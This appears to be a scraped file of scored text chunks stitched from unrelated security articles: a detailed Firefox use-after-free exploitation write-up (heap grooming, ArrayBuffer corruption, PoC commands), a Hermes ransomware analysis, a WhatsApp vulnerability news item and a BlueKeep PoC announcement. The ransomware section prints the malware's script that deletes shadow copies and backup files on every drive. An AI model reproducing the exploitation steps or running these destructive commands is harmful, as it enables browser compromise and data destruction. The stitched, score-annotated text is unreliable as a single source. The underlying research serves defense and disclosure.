mMapPtr = nullptr;",0.02266330866643551
"// The memory-mapped contents will be released when the ArrayBuffer
// becomes detached or is GC'd.
return obj;
}",0.015844049325840492
"In the above code, if we modify mMapPtr before the function begins we will get an ArrayBuffer object pointing to whatever address we put in mMapPtr instead of the expected returned data. Accessing the returned ArrayBuffer object will allow us to read and write from the memory pointed to by mMapPtr.",0.010600667983760581
"To prime an XHR object into this conveniently corruptible state, it needs to be put into a state where an actual request has been sent and is awaiting response. We can set the resource being requested by the XHR to be a Data URI, to avoid the delay and overhead of network activity:xhr.open(""GET"", ""data:text/plain,xxxxxxxxxx"", true);
mMapPtr is contained inside sub-class ArrayBufferBuilder inside the XMLHttpRequestMainThread class, which is the actual implementation class of XMLHttpRequest objects internally. Its size is 0x298:",0.01216561772789626
"Allocations of size 0x298 go into a 0x400 size class bin, therefore an XMLHttpRequestMainThread object will always be placed in a memory address that belongs to one of these patterns: 0xXXXXXXXXX000, 0xXXXXXXXXX400, 0xXXXXXXXXX800, or 0xXXXXXXXXXc00. This synchronizes nicely with the pattern of mHandles allocations which is 0xXXXXXXXXX000.
To corrupt an XHR’s mArrayBufferBuilder.mMapPtr value using the bug we would have to aim for an offset of 0x250 bytes into the freed mHandles allocation:",0.012574286763401776
"So XMLHttpRequestMainThread is a fitting target for exploitation of this memory corruption, but its size class is different than mHandle‘s, requiring us to rely on performing the “Run recycling” technique.
To aid in performing the precise heap actions required for “grooming” the heap to behave this way, we are going to be using another object type:
FormData for Heap Grooming
Simply put, FormData is an object type that holds sets of key/value pairs supplied to it.",0.014435018717322667
"var formData = new FormData();
formData.append(""username"", ""Groucho"");
formData.append(""accountnum"", ""123456"");",0.015486764598416358
"Internally it uses the data structure FormDataTuple to represent a key/value pair, and a member variable called mFormData to store the pairs it’s holding:nsTArray mFormData;
mFormData is initially an empty array. Calls to the append() and delete() methods add or remove elements in it. The nsTArray class uses a dynamic memory allocation for storing its elements, expanding or shrinking its allocation size as necessary.
This is how FormData chooses the size of allocation for this storage buffer:",0.012962908545522622
"nsTArray_base<Alloc, Copy&gt;::EnsureCapacity(size_type aCapacity,
size_type aElemSize) {
...
size_t reqSize = sizeof(Header) + aCapacity * aElemSize;
...
// Round up to the next power of two.
bytesToAlloc = mozilla::RoundUpPow2(reqSize);
...
header = static_cast<Header*&gt;(ActualAlloc::Realloc(mHdr, bytesToAlloc));",0.016652836530314796
"Given that sizeof(Header) == sizeof(nsTArrayHeader) == 8 and aElemSize == sizeof(FormDataTuple) == 0x30, This is the formula for getting the buffer allocation size as a function of the number of elements in the array (aCapacity):
bytesToAlloc = RoundUpPow2(8 + aCapacity * 0x30)
From this we can calculate that mFormData will perform a realloc() call for 0x400 bytes upon the 11th pair appended to it, a 0x800 bytes realloc() upon the 22nd pair, and a 0x1000 bytes realloc() upon the 43rd pair. The buffer’s address is stored in mFormData.mHdr.
To cause the de-allocation of mFormData.mHdr we can use the delete() method. It takes as parameter a single key name to remove from the array, but different pairs may use the same key name. So if the same key name is reused for every appended pair, calling delete() on that key name will clear the entire array in one run. Once a nsTArray_base object is reduced to hold 0 elements, the memory in mHdr will be freed.
To summarize we can use FormData objects to arbitrarily perform allocations and de-allocations of memory of particular sizes in the Firefox heap.
Knowing this, these are the steps we can take for placing a 0x400 size class allocation in place of a 0x1000 size class allocation (Implementation of “Run recycling”):",0.013063849927704818
Spray 0x1000 allocations,0.006839952095794244
"Create many FormData objects, and append 43 pairs to each of them. Now the heap contains many chunks full of mostly contiguous 0x1000 runs holding our mFormData.mHdr buffers.",0.013110836029605832
“Poke holes” in memory,0.007457717465806479
"Use delete() to de-allocate some mFormData.mHdr buffers, so that there are free 0x1000 sized spaces in between blocks of mFormData.mHdr allocations.",0.009992420139331881
Trigger mHandles‘s allocation,0.008132126919820237
"Append the child iframe, causing the creation of an HTML parser and with it an nsHtml5TreeBuilder object with an mHandles allocation. Due to “LIFO free list” mHandles should get the same address as one of the buffers de-allocated in the previous step.",0.011703980282116722
Free mHandles,0.0071256974503729476
Cause the freeing of mHandles (process described here).,0.013669753048191291
Free all 0x1000 allocations,0.007369071183228493
Use delete() on all remaining FormData‘s.,0.01175494747619299
Spray 0x400 allocations,0.006345535595145391
Create many XMLHttpRequest objects.,0.01717438364008428
Image illustrations:,0.009128832145960941
"If done correctly, triggering the bug after executing these steps will corrupt one of the created XMLHttpRequest objects created in step 6 so that its mArrayBufferBuilder.mMapPtr variable now points to an HTML element object.We can go on to iterate through all the created XHR objects and check their response property. If any of them contains unexpected data (""xxxxxxxxxx"" would be the expected response for the Data URI request previously used here) then it must have been successfully corrupted as a result of the bug, and we now have an ArrayBuffer object capable of reading and writing the memory of the newly created HTML element object.
This alone would be enough for us to bypass ASLR by reading the object’s member variables, some of them pointing to variables in Firefox’s main DLL xul.dll. Also control of program execution is possible by modifying the object’s virtual table pointer. However as previously mentioned this HTML element object is left orphaned, cannot be referenced by JavaScript and is slated for de-allocation, so another approach has to be taken.
If you look again at the ArrayBufferBuilder::getArrayBuffer function quoted above, you can see that even in a corrupted state, the created ArrayBuffer object is set to have the same length as it would have for the original response, since only mMapPtr is modified, with mLength being left intact.
Since the response size is going to be the same size we choose the requested Data URI to be, we can set it arbitrarily and make sure the malformed ArrayBuffer‘s length is big enough to cover not only the HTML element it will point to, but to extend its reach of manipulation to a decent amount of memory following the HTML element.
The specific type of HTML element object to be written into mMapPtr is determined by the base type of HTML element we choose to extend with our custom element definition. HTML element objects range in size between 0x80 and 0x6d8:",0.016027947366500483
"Thus we can choose between different heap size classes to target for manipulation by the malformed ArrayBuffer. For example, choosing to extend the “br” HTML element will result in a pointer to an HTMLBRElement (size 0x80) object being written to mMapPtr.
As stated in the definition of heap bins, the memory immediately following the HTML element will hold other allocations of the same size class.To target the placement of a specific object right after the HTML element we can take advantage of the “Same size class allocations are contiguous” heap property and:",0.014217469920057568
"Find an HTML element of the same size class as the targeted object, and base the custom element definition on it.
Exhaust the relevant bin’s free list by allocating many instances of the same HTML element type. This fits well with the objective corruption offset of 0x250 bytes because defining many elements prior to the custom one is a necessity for reaching this offset and it helps us accomplish the exhaustion apropos.
Allocate the object targeted for placement as soon as possible after the allocation of the custom HTML element object. The custom element’s constructor is invoked right after that so the object should be created first thing inside the constructor function.",0.017798097219974385
"The most straight-forward approach to take advantage of this capability would be to make use of what we already know about XMLHttpRequest objects and use it as the target object. Previously we could only corrupt mMapPtr with a non-controllable pointer, but now with full control over manipulation of the object we can arbitrarily set mMapPtr and mLength to be able to read and write any address in memory.
However XMLHttpRequestMainThread objects belong in the 0x400 size class and no HTML element object falls under the same size class!
So another object type has to be used. The FileReader object is somewhat similar to XMLHttpRequest, in that it reads data and can be made to return it as an ArrayBuffer.",0.009153611052863053
"var arrayBuffer;
var blob = new Blob([""data to read""]);
var fileReader = new FileReader();
fileReader.onload = function(event) {
arrayBuffer = event.target.result;
if (arrayBuffer) {
var byteArray = new Uint8Array(arrayBuffer);
for (var i = 0; i < byteArray.byteLength; i++) {
// do something with each byte in the array
}
}
};
fileReader.readAsArrayBuffer(blob);",0.022968693249869943
"Similar to the case with XMLHttpRequest, FileReader uses the ArrayBuffer creation function JS::NewArrayBufferWithContents with its member variables mFileData and mDataLen as parameters:",0.013627026644929763
"nsresult FileReader::OnLoadEnd(nsresult aStatus) {
...
// ArrayBuffer needs a custom handling.
if (mDataFormat == FILE_AS_ARRAYBUFFER) {
OnLoadEndArrayBuffer();
return NS_OK;
}
...
}",0.016188607994958915
"void FileReader::OnLoadEndArrayBuffer() {
...
mResultArrayBuffer = JS::NewArrayBufferWithContents(cx, mDataLen, mFileData);",0.016087801085949538
"If we can corrupt the FileReader object in memory between the call to readAsArrayBuffer() and the scheduling of the onload event using the malformed ArrayBuffer we previously created, we can cause FileReader to create yet another malformed ArrayBuffer but this time pointing to arbitrary addresses.
The FileReader object is suitable for exploitation here because of its size:",0.011327581189941038
"which is compatible with the “img” element (HTMLImageElement), whose object size is 0x138.
Illustration of a malformed ArrayBuffer pointing to a custom element, but also able to reach some of the adjacent FileReader objects
Creation and usage of objects in aborted document
Another side of effect of the abortion of the child iframe document is that any XMLHttpRequest or FileReader object created from inside of it will get detached from their “owner” and will no longer be usable in the way we desire.
Since we require the creation of new XMLHttpRequest and FileReader objects at a specific point in time while the custom element constructor is running inside the child iframe document, but also require their usage after the document load has been aborted, we can use the following method of “synchronously” passing execution to the main page by employing postMessage() and event loop spinning using XHR:
sync.html:",0.0147831002309603
sync2.html:,0.007672076109539905
"Will yield the output:point 1 (child iframe)point 2 (main page)point 3 (child iframe)
This way we can enable JavaScript code running from the child iframe to signal and schedule the execution of a JavaScript function in the main page, and be guaranteed it finishes running before gaining control back.
PoC
The PoC builds on all written above to produce an ArrayBuffer that can be used to read and write memory from 0x4141414141414141. It does not work in every single attempt, but has been tested successfully on Windows and Linux.
The HTML file is meant to be served by the provided HTTP server script delay_http_server.py for the necessary artificial delay to responses.
$ python delay_http_server.py 8080 &
$ firefox http://127.0.0.1:8080/customelements_poc.html
You can find the proof-of-concept files on the SophosLabs GitHub repository.
Fix
The bug was fixed in Firefox 65.0 with this commit.
Mozilla fixed the issue by declaring a RAII type variable to hold a reference to the HTML5 stream parser object for the duration of execution of the 2 functions that make calls to nsHtml5TreeOperation::Perform: nsHtml5TreeOpExecutor::RunFlushLoop and nsHtml5TreeOpExecutor::FlushDocumentWrite.",0.011046859269263631
"+  RefPtr<nsHtml5StreamParser&gt; streamParserGrip;
+  if (mParser) {
+    streamParserGrip = GetParser()-&gt;GetStreamParser();
+  }
+  mozilla::Unused << streamParserGrip;  // Intentionally not used within function",0.012203962580493943
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Hermes ransomware distributed to South Koreans via recent Flash zero-day
This blog post was authored by @hasherezade, Jérôme Segura and Vasilios Hioureas.
At the end of January, the South Korean Emergency Response Team (KrCERT) published news of a Flash Player zero-day used in targeted attacks. The flaw, which exists in Flash Player 28.0.0.137 and below, was distributed via malicious Office documents containing the embedded Flash exploit. Only a couple of weeks after the public announcement, spam campaigns were already beginning to pump out malicious Word documents containing the newly available exploit.
While spam has been an active distribution channel for some time now, the news of a Flash exploit would most certainly interest exploit kit authors as well. Indeed, in our previous blog post about this vulnerability (CVE-2018-4878), we showed how trivial it was to use an already available Proof-of-Concept and package it as as a drive-by download instead.
On March 9th, MDNC discovered that a less common, but more sophisticated exploit kit called GreenFlash Sundown had started to use this recent Flash zero-day to distribute the Hermes ransomware. This payload was formerly used as part of an attack on a Taiwanese bank and suspected to be the work of a North Korean hacking group. According to some reports, it may be a decoy attack and “pseudo-ransomware“.
By checking on the indicators published by MDNC, we were able to identify this campaign within our telemetry and noticed that all exploit attempts were made against South Korean users. Based on our records, the first hit happened on February 27, 2018, (01:54 UTC) via a compromised Korean website.",0.014667098978585091
"We replayed this attack in our lab and spent a fair amount of time looking for redirection code within the JavaScript libraries part of the self hosted OpenX server. Instead, we found that it was hiding in the main page’s source code.
We had already pinpointed where the redirection was happening by checking the DOM on the live page, but we also confirmed it by decoding the large malicious blurb that went through Base64 and RC4 encoding (we would like to thank David Ledbetter for that).
Hermes ransomware
The payload from this attack is Hermes ransomware, version 2.1.
Behavioral analysis
The ransomware copies itself into %TEMP% under the name svchosta.exe and redeploys itself from that location. The initial sample is then deleted.",0.011253797599182325
"The ransomware is not particularly stealthy—some windows pop up during its run. For example, we are asked to run a batch script with administrator privileges:",0.01272215010796851
"The authors didn’t bother to deploy any UAC bypass technique, relying only on social engineering for this. The pop-up is deployed in a loop, and by this way it tries to force the user into accepting it. But even if we don’t let the batch script be deployed, the main executable proceeds with encryption.
The batch script is responsible for removing the shadow copies and other possible backups:",0.00980649393501809
It is dropped inside C:\Users\Public along with some other files:,0.007642807435497168
"The file “PUBLIC” contains a blob with RSA public key. It is worth noting that this key is unique on each run, so, the RSA key pair is generated per victim. Example:",0.011846614680616874
"Another file is an encrypted block of data named UNIQUE_ID_DO_NOT_REMOVE. It is a blob containing an encrypted private RSA key, unique for the victim:",0.0114928867132984
"Analyzing the blob header, we find the following information:",0.013999321550042576
"0x07 –  PRIVATEKEYBLOB
0x02 – CUR_BLOB_VERSION: 2
0xA400 – ALG_ID: CALG_RSA_KEYX",0.011902821257384066
"The rest of the data is encrypted—at this moment, we can guess that it is encrypted by the RSA public key of the attackers.
The same folder also contains a ransom note. When the encryption finished, the ransom note pops up. The note is in HTML format, named DECRYPT_INFORMATION.html.",0.012414317282403942
"The interesting fact is that, depending on the campaign, in some of the samples the authors used BitMessage to communicate with victims:",0.00975967822364221
"This method was used in the past by a few other authors, for example in Chimera ransomware, and by the author of original Petya in his affiliate programs.
Encrypted files don’t have their names changed. Each file is encrypted with a new key—the same plaintext produces various ciphertext. The entropy of the encrypted file is high, and no patterns are visible. That suggests that some stream cipher or a cipher with chained blocks was used. (The most commonly used in such cases is AES in CBC mode, but we can be sure only after analyzing the code). Below, you can see a visualization of a BMP file before and after being encrypted by Hermes:
Inside each file, after the encrypted content, there is a “HERMES” marker, followed by another blob:",0.012982530940069847
"This time the blob contains an exported session key (0x01 : SIMPLEBLOB) and the algorithm identifier is AES (0x6611: CALG_AES). We can make an educated guess that it is the AES key for the file, encrypted by the victim’s RSA key (from the generated pair).
The ransomware achieves persistence by dropping a batch script in the Startup folder:",0.020934704104999535
The script is simple; its role is just to deploy the dropped ransomware: svchosta.exe.,0.00976465998791376
"So, on each system startup it will make a check for new, unencrypted files and try to encrypt them. That’s why, as soon as one discovers that they have been attacked by this ransomware, they should remove the persistence entry in order to not let the attack repeat itself.
Inside the ransomware
Execution flow
At the beginning of the execution, the ransomware creates a mutex named “tech”:",0.016936903596256214
"The sample is mildly obfuscated, for example, its imports are loaded at runtime. The .data section of the PE file is also decrypted during the execution, so, at first we will not see the typical strings.
First, the executable begins to dynamically load all its imports via a function at 4023e0:",0.012358914630065887
"It then checks the registry key for a language code. If Russian, Belarusian, or Ukrainian are found as the system language, it exits the process (0x419 being Russian, 422 Ukrainian, and 423 Belarusian).",0.01773911317997523
"It then creates two subprocesses – cmd.exe. One that copies itself into directory appdata/local/temp/svchost.exe, and another that executes the copied file.
It also generates crypto keys using standard CryoptAquireCOntext libraries, and saves the public key and some kind of ID into the following files:
C:\Users\Public\UNIQUE_ID_DO_NOT_REMOVE
C:\Users\Public\PUBLIC
As mentioned earlier, it writes out a script to auto run on startup with contents: start “” %TEMP%\svchosta.exe into the Start menu startup folder. This is quite simple and conspicuous. Since it is always running and keeps persistence, it makes sense that it saved out the public key into a file so that it can later find that key and continue encrypting using a consistent key throughout all executions.
Below is the function that calls all of this functionality sequentially, labeled:",0.011065609270135557
"It proceeds to cycle all available drives. If it is CDRom, it will skip it. Inside the function, it goes through all files and folders on the drive, but skips a few key directories, not limited to Windows, Mozilla, and the recycling bin.",0.013013081870738574
Inside of the function labeled recursiveSearch_Encrypt are the checks for key folders and drive type:,0.008784669429722336
"It then continues on to enumerate netResources and encrypts those files as well. After encryption, it creates another bat file called window.bat to delete shadow volume and backup files. Here is its content:
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
del %0",0.01608413714951662
"It then creates and executes another bat file called svchostaaexe.bat that cycles through the entire file system again to search for and delete all backup files. This is interesting, as we have rarely seen ransomware looking in so much detail for backup files.
There is no functionality that communicates a decryption key to a C2 server. This means that the file UNIQUE_ID_DO_NOT_REMOVE, which contains the unique ID you have to send to the email address, must be encrypted by a public key pair that the attackers have pre-generated and retained on their side.
We have found that there is a heavy code reuse from the old versions of Hermes with this one. The flow of the code looks to be a bit different, but the overall functionality is the same. This is quite clear when comparing the two versions in a disassembler.
Below are two screenshots: the first from the current version we are analyzing, and the second from the old version. You can clearly see that even though the flow and arrangement are a bit different, the functionality remains mostly the same.
The new version:",0.01282045250496322
And the old version 237eee069c1df7b69cee2cc63dee24e6:,0.006557223653115063
"Attacked targets
The ransomware attacks the following extensions:",0.009215024750094503
tif php 1cd 7z cd 1cd dbf ai arw txt doc docm docx zip rar xlsx xls xlsb xlsm jpg jpe jpeg bmp db eql sql adp mdf frm mdb odb odm odp ods dbc frx db2 dbs pds pdt pdf dt cf cfu mxl epf kdbx erf vrp grs geo st pff mft efd 3dm 3ds rib ma max lwo lws m3d mb obj x  x3d c4d fbx dgn dwg 4db 4dl 4mp abs adn a3d aft ahd alf ask awdb azz bdb bib bnd bok btr bak cdb ckp clkw cma crd dad daf db3 dbk dbt dbv dbx dcb dct dcx ddl df1 dmo dnc dp1 dqy dsk dsn dta dtsx dxl eco ecx edb emd fcd fic fid fil fm5 fol fp3 fp4 fp5 fp7 fpt fzb fzv gdb gwi hdb his ib idc ihx itdb itw jtx kdb lgc maq mdn mdt mrg mud mwb s3m myd ndf ns2 ns3 ns4 nsf nv2 nyf oce oqy ora orx owc owg oyx p96 p97 pan pdb pdm phm pnz pth pwa qpx qry qvd rctd rdb rpd rsd sbf sdb sdf spq sqb stp str tcx tdt te tmd trm udb usr v12 vdb vpd wdb wmdb xdb xld xlgc zdb zdc cdr cdr3 ppt pptx abw act aim ans apt asc ase aty awp awt aww bad bbs bdp bdr bean bna boc btd cnm crwl cyi dca dgs diz dne docz dot dotm dotx dsv dvi dx eio eit emlx epp err etf etx euc faq fb2 fbl fcf fdf fdr fds fdt fdx fdxt fes fft flr fodt gtp frt fwdn fxc gdoc gio gpn gsd gthr gv hbk hht hs htc hwp hz idx iil ipf jis joe jp1 jrtf kes klg knt kon kwd lbt lis lit lnt lp2 lrc lst ltr ltx lue luf lwp lyt lyx man map mbox me mell min mnt msg mwp nfo njx now nzb ocr odo odt ofl oft ort ott p7s pfs pfx pjt prt psw pu pvj pvm pwi pwr qdl rad rft ris rng rpt rst rt rtd rtf rtx run rzk rzn saf sam scc scm sct scw sdm sdoc sdw sgm sig sla sls smf sms ssa stw sty sub sxg sxw tab tdf tex text thp tlb tm tmv tmx tpc tvj u3d u3i unx uof uot upd utf8 utxt vct vnt vw wbk wcf wgz wn wp wp4 wp5 wp6 wp7 wpa wpd wpl wps wpt wpw wri wsc wsd wsh wtx xdl xlf xps xwp xy3 xyp xyw ybk yml zabw zw abm afx agif agp aic albm apd apm apng aps apx art asw bay bm2 bmx brk brn brt bss bti c4 cal cals can cd5 cdc cdg cimg cin cit colz cpc cpd cpg cps cpx cr2 ct dc2 dcr dds dgt dib djv djvu dm3 dmi vue dpx wire drz dt2 dtw dvl ecw eip exr fal fax fpos fpx g3 gcdp gfb gfie ggr gif gih gim spr scad gpd gro grob hdp hdr hpi i3d icn icon icpr iiq info ipx itc2 iwi j  j2c j2k jas jb2 jbig jbmp jbr jfif jia jng jp2 jpg2 jps jpx jtf jwl jxr kdc kdi kdk kic kpg lbm ljp mac mbm mef mnr mos mpf mpo mrxs myl ncr nct nlm nrw oc3 oc4 oc5 oci omf oplc af2 af3 asy cdmm cdmt cdmz cdt cgm cmx cnv csy cv5 cvg cvi cvs cvx cwt cxf dcs ded dhs dpp drw dxb dxf egc emf ep eps epsf fh10 fh11 fh3 fh4 fh5 fh6 fh7 fh8 fif fig fmv ft10 ft11 ft7 ft8 ft9 ftn fxg gem glox hpg hpgl hpl idea igt igx imd ink lmk mgcb mgmf mgmt mt9 mgmx mgtx mmat mat otg ovp ovr pcs pfv pl plt vrml pobj psid rdl scv sk1 sk2 ssk stn svf svgz sxd tlc tne ufr vbr vec vml vsd vsdm vsdx vstm stm vstx wpg vsm xar yal orf ota oti ozb ozj ozt pal pano pap pbm pc1 pc2 pc3 pcd pdd pe4 pef pfi pgf pgm pi1 pi2 pi3 pic pict pix pjpg pm pmg pni pnm pntg pop pp4 pp5 ppm prw psdx pse psp ptg ptx pvr px pxr pz3 pza pzp pzs z3d qmg ras rcu rgb rgf ric riff rix rle rli rpf rri rs rsb rsr rw2 rwl s2mv sci sep sfc sfw skm sld sob spa spe sph spj spp sr2 srw ste sumo sva save ssfn t2b tb0 tbn tfc tg4 thm tjp tm2 tn tpi ufo uga vda vff vpe vst wb1 wbc wbd wbm wbmp wbz wdp webp wpb wpe wvl x3f y  ysp zif cdr4 cdr6 cdrw ddoc css pptm raw cpt pcx pdn png psd tga tiff tif xpm ps sai wmf ani flc fb3 fli mng smil svg mobi swf html csv xhtm dat,0.0322998434103855
"Encryption
Hermes, like many other ransomware, uses AES along with RSA for the encryption. AES is used to encrypt files with a random key. RSA is used to protect the random AES key.
The ransomware uses two RSA key pairs, one being a RSA hardcoded public key for the attackers.",0.017147517240580168
"Then, there is a keypair for the victim. It is generated at the beginning of the attack. The private key from this key pair is encrypted by the attackers’ public key and stored in the file UNIQUE_ID_DO_NOT_REMOVE.
When the victim sends this file, the attackers can recover the victim’s private key with the help of their own private key. The victim’s public key is stored in PUBLIC in clear text. It is later used to encrypt random AES keys, generated per file.
Cryptography is implemented with the help of Windows Crypto API. Function calls are mildly obfuscated, and pointers to the functions are manually loaded.",0.014878212780779387
"Each file processing starts from checking if it was already encrypted. The ransomware uses the saved marker “HERMES” that we already saw during the behavioral analysis. The marker is stored at the end of the file, before the block where the AES key is saved. Its offset is 274 bytes from the end. So, first the file pointer is set at this position to make a check of the characters.",0.010290799867076705
"If the marker was found, the file is skipped. Otherwise, it is processed further. As we noticed during the behavioral analysis, each file is encrypted with a new key. Looking at the code, we can find the responsible function. Unfortunately for the victims, the authors used the secure function CryptGenKey:",0.014766990699497495
"The used identifier for the algorithm is 0x6610 (CALG_AES_256). That means 256-bit is using AES encryption. This key is used to encrypt the content of the file. The file is read and encrypted in chunks, with 1,000,000 bytes each.",0.010724778000334556
"At the end, the marker “HERMES” is written and the exported AES key is saved:",0.010148084905847732
"The handle to the attacker’s RSA public key is passed, so the function CryptExportKey automatically takes care of protecting the AES key. Only the owner of the RSA private key will be able to import it back.
Protection
Malwarebytes users are  protected against this Flash Player exploit. In addition, the ransomware payload was blocked at zero-hour strictly based on its malicious behaviour.",0.011100557423674995
"Conclusion
Another campaign that we know of targeting South Koreans specifically is carried by malvertising and uses the Magnitude exploit kit, which also delivers ransomware—namely Magniber. That particular infection chain goes to great lengths to only infect this particular demographic, via geo-aware traffic redirection and language checks within the malware code itself.
After analyzing Hermes, we found it to be a fully functional ransomware. However, we cannot be sure what the real motivations of the distributors were. Looking at the full context, we may suspect that it was politically motivated rather than a profit-driven attack.
Although the infection vector appeared to narrow down to South Korea, the malware itself, unlike Magniber, does not specifically target these users. The fact that the ransomware excludes certain countries like Russia or Ukraine could tie the development and outsourcing of the malware to these areas or be a false flag. As we know, attribution is always a complex topic.
Indicators of compromise
Domains involved in campaign:",0.013068942405726869
2018-02-27 (01:54 UTC),0.017109414558629576
"staradvertsment[.]com
hunting.bannerexposure[.]info",0.011290705317480776
2018-02-28,0.00965433977571084
"staradvertsment[.]com
accompanied.bannerexposure[.]info",0.011593195936390965
2018-03-01,0.009741314159422032
switzerland.innovativebanner[.]info,0.010160107565029386
2018-03-07,0.009596045041473822
name.secondadvertisements[.]com,0.010359756978785328
2018-03-08,0.009531184090885492
"assessed.secondadvertisements[.]com
marketing.roadadvertisements[.]com",0.012192361270755958
2018-03-09,0.00967527983167682
"bannerssale[.]com
aquaadvertisement[.]com
technologies.roadadvertisements[.]com",0.012362746740848807
IP addresses:,0.008422540665210754
"159.65.131[.]94
159.65.131[.]94
207.148.104[.]5",0.013563332609747736
Hermes 2.1 ransomware:,0.007535463627932115
"A5A0964B1308FDB0AEB8BD5B2A0F306C99997C7C076D66EB3EBCDD68405B1DA2
pretty040782@gmail[.]com
pretty040782@keemail[.]me
",0.012046853915358646
"WhatsApp fix goes live after targeted attack on human rights lawyer
If you use WhatsApp, you’ll want to update both app and device as soon as possible due to a freshly-discovered exploit. The vulnerability was found in Google Android, Apple iOS, and Microsoft Windows Phone builds of the app.
Unlike many mobile attacks, potential victims aren’t required to install or click on anything—they may not even be aware something malicious has taken place.
This attack came to light after CitizenLab suspected a human rights lawyer was being targeted, and after observing, deduced that they were, but the attacks were blocked by the fixes WhatsApp put in place.
We should stress these are smart, high-level attacks and not typically rolled out to target random people. No need to start panicking. Just apply fixes as required, and go about your day.
What typically happens with a mobile attack?
A large portion of mobile attacks usually involve some form of social engineering. Mobile manufacturers insist customers use their own closed ecosystem store to lessen the risk of becoming infected by something out in the wild.
For example, iPhone users can only download apps from iTunes. And Android devices have installs from third parties or unknown sources switched off by default. This means if your child ends up on a fake Angry Birds website offering up a bogus installer, they won’t be able to install the app because the device won’t allow it (unless you switched off the default settings).
While bad files can and do lurk on official mobile stores, ignoring unknown source installs definitely helps keep infection numbers down.
This sounds like a non-typical mobile hijack
That would definitely be the case.
The WhatsApp team worked out that a simple missed call was all it took to inject commercial spyware into the device. The call, made using WhatsApp’s voice call function, would lead to the infection being installed on the phone silently. It appears all record of the call log would be scrubbed too, so the victim wouldn’t even be aware something was amiss.
This is similar to how malware on the desktop will often delete files after the event to remain as stealthy as possible. When this happens, it can take a long time before someone realises what’s up. When they do, it’s usually too late, and the attackers have already reached their chosen objective.
What is the impact?
Whether your mobile device is used for something important or you do little beyond making calls, this exploit could do some serious damage. The spyware can scan messages and emails, alongside grabbing location data. Even if you think malware on your phone isn’t a big deal because you don’t do anything important on it, the attackers have something for everyone. Namely, the ability to turn on a phone’s microphone and camera, access photos, contacts, and more.
Given the stealthy way the attack was attempted, it’s impressive that WhatsApp caught it as quickly as they did. Engineers at Facebook have been busy sorting this one out over the weekend.
Is there an advisory?
There sure is. Named CVE-2019-3568, the advisory reads as follows:
Description: A buffer overflow vulnerability in WhatsApp VOIP stack allowed remote code execution via specially crafted series of SRTCP packets sent to a target phone number.
Affected Versions: The issue affects WhatsApp for Android prior to v2.19.134, WhatsApp Business for Android prior to v2.19.44, WhatsApp for iOS prior to v2.19.51, WhatsApp Business for iOS prior to v2.19.51, WhatsApp for Windows Phone prior to v2.18.348, and WhatsApp for Tizen prior to v2.18.15.
Last Updated: 2019-05-13
What do we do now?
In a word, update. If your apps and devices are set to update automatically, you should be good to go. If not, go and update manually as soon as possible. As mentioned earlier, you probably shouldn’t worry about having been infected, as it seems to have been a carefully targeted attack. There’s an excellent chance you’re not on the radar.
In fact, if your updates aren’t set to automatic, your immediate concerns should be about more mundane security threats. Please consider switching to automatic and save yourself needless worries.
For more information on general mobile security, feel free to check out our guide to spotting mobile phishes, and some simple tips for good mobile hygiene. With that, plus Malwarebytes’ security apps for Android and iOS, you should be good to go.
",0.01651751321861572
BlueKeep PoC demonstrates risk of Remote Desktop exploit,0.006000839874263142
"If you've been deferring installing Microsoft's May monthly update rollup, now's a good time to get started - even if you're still using XP for some reason",0.01767818990621617
"Written by
Andrew Brandt",0.009442099916216584
"July 01, 2019",0.008649665957113362
SophosLabs Uncut,0.008173560271443003
"In light of several reports showing that the number of unpatched RDP servers on the internet is still very high, despite warnings by experts and government agencies, we recorded a video that shows a proof-of-concept BlueKeep attack using an exploit developed by Christophe Alladoum of SophosLabs’ Offensive Research team. We hope this video convinces individuals and organizations who still haven’t patched that the BlueKeep vulnerability is a serious threat. BlueKeep affects computers running Windows XP, Windows 7, Windows Server 2003, and Windows Server 2008.
The exploit works in a completely fileless fashion, providing full control of a remote system without having to deploy any malware. It also doesn’t require an active session on the target.
The development of this exploit came about as the result of an arduous process of reverse-engineering the patch released by Microsoft in May to examine what it was trying to fix. Microsoft themselves did not release any information about BlueKeep to companies that are part of its MAPP program – other than a request that everyone install the update with minimal delay.",0.01305329639411923
"Sophos will not be releasing the PoC to the public out of an abundance of caution. If someone was able to weaponize the PoC, any of the machines currently vulnerable to BlueKeep would instantly become targets of opportunity for an attacker who could leverage the method to deliver malware or, well, do anything that the administrative owner of a vulnerable Windows computer could do with that computer.
Microsoft considers the BlueKeep vulnerability so dire, they have taken the unusual step of releasing patches intended to protect versions of their operating system that no longer receive regular updates and have reached “end of life,” such as Windows XP.
